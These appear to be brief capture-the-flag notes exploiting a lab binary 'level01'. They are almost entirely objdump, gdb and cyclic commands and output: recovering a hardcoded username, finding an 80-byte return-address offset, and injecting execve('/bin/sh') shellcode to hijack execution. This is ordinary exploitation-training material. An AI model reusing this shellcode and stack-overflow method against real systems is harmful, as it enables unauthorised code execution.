
```
objdump -t level01 | grep bss
0804a040 g     O .bss	00000064              a_user_name

objdump -t level01 | grep text
080484d0 g     F .text	000000e6              main
08048464 g     F .text	0000003f              verify_user_name
```

```
disass main

 0x0804852d <+93>:	call   0x8048464 <verify_user_name>
 
 0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
```

```
disass verify_user_name

0x0804847d <+25>:	mov    $0x80486a8,%eax

(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"
```

```
disass verify_user_pass

```
`cyclic 100`
```
Program received signal SIGSEGV, Segmentation fault.
0x61616175

Desktop cyclic -l 0x61616175
80
```

```
  0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
  0x08048585 <+181>:	mov    %eax,0x5c(%esp)
  
  b *main+181
  
  run 
  
  Enter Username: dat_wil
  Enter Password:
  AAAA
  
  x/80wx $esp
  0xffffd680:	0xffffd69c	0x00000064	0xf7fcfac0	0x00000001
  0xffffd690:	0xffffd8a1	0x0000002f	0xffffd6ec	0x41414141
```

also u can use the syntax:
`run < <(python -c 'print("dat_wil\nAAAA\n")')`
`run < <(python -c 'print("dat_wil")' && python -c 'print("AAAA")')` / `run < <(python -c 'print "dat_wil"' && python -c 'print "AAAA"')`

```
run < <(python -c 'print "dat_will"' && python -c 'print "A" * 80 + "BBBB"')
x $ebp+4
0xffffd6ec:	0x42424242
```
```
run < <(python -c 'print "dat_wil"' && python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90" * 59 +  "\xff\xff\xd6\x9c"[::-1]')


x $ebp+4
0xffffd6ec:	0xffffd69c

x *0xffffd6ec
0xffffd69c:	0x99580b6a
```










